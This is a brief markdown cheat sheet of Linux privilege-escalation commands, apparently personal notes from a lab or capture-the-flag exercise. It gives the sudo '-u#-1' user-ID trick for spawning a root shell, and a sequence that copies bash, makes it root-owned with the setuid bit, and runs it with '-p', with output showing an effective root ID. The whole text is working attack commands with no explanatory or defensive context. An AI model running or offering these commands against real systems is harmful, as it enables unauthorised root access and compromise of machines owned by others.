#### SUDO BASH
```
sudo -u#-1 /bin/bash -i
```

#### Making Bash Executable for Root Priv Esc
```
cp /usr/bin/bash /home/james/

sudo chown root:root bash

sudo chmod +s bash

./bash -p

uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
```
